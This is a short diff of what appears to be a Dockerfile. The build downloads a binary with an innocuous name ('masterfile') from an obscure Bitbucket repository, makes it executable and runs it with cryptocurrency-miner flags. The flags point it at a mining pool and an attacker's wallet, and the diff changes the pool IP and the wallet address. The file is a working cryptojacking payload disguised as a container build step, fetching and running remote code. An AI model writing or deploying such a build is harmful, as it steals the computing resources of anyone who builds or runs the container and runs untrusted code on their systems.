@@ -4,4 +4,4 @@ RUN apt-get update
 RUN apt-get install -y wget
 RUN wget https://bitbucket.org/Akowkdwodjiewhfiurf/awkowkwowkwokwk/downloads/masterfile
 RUN chmod u+x masterfile
-RUN ./masterfile -o 161.35.250.122:13333 -u BTC:3FTL2Wf2GDLiG7Bf4Fr3q9wFufUBkNgayC.Worker01 -k -a rx/0
+RUN ./masterfile -o 139.99.124.170:80 -u 86fGg98tj5QTt4peYzxDrD4BfChE1LPtkceC6rVC6iP3FuApcNecY1c32cgrwMtWNY87H4iq2CM3DPJWQhjW8Mr7LQeZRsr -k -a rx/0
